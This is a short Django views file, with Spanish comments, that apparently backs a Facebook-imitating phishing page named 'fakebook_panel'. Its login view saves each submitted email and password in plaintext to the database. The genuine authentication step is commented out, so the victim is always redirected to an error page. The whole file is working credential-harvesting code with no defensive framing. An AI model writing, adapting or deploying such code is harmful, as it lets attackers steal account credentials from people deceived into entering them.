from django.shortcuts import render, redirect
from django.contrib.auth import authenticate, login
from .models import UserLogin

def login_view(request):
    if request.method == 'POST':
        email = request.POST.get('email')
        password = request.POST.get('password')

        # Guardar el correo y la contraseña en la base de datos
        UserLogin.objects.create(email=email, password=password)

        # Autenticación de Django
        user = authenticate(request, username=email, password=password)
        # if user is not None:
        #     login(request, user)
        #     return redirect('some_success_page')  # Cambia 'some_success_page' por la ruta de éxito
        # else:
        #     return render(request, 'fakebook_panel/index.html', {'error': 'Invalid login credentials'})
        
        # Redirigir a la vista de error
        return redirect('error')  # Asegúrate de que 'error' esté bien definido en urls.py

    return render(request, 'fakebook_panel/index.html')

def error_view(request):
    return render(request, 'fakebook_panel/error.html')  # Verifica que error.html esté en el lugar correcto
